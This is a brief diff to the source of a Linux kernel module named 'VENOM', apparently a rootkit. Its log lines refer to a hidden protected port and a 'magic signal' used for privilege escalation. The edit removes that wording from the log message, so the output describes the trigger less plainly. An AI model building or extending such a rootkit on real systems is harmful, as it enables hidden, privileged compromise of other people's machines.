@@ -143,7 +143,7 @@ notrace static int __init venom_init(void) {
 
     TLOG_INF("[VENOM] All protection systems active\n");
     TLOG_INF("[VENOM] Protected port: %d\n", HIDDEN_PORT);
-    TLOG_INF("[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL);
+    TLOG_INF("[VENOM] Magic signal: %d \n", MAGIC_KILL_SIGNAL);
 
     
     return 0;
@@ -156,4 +156,5 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
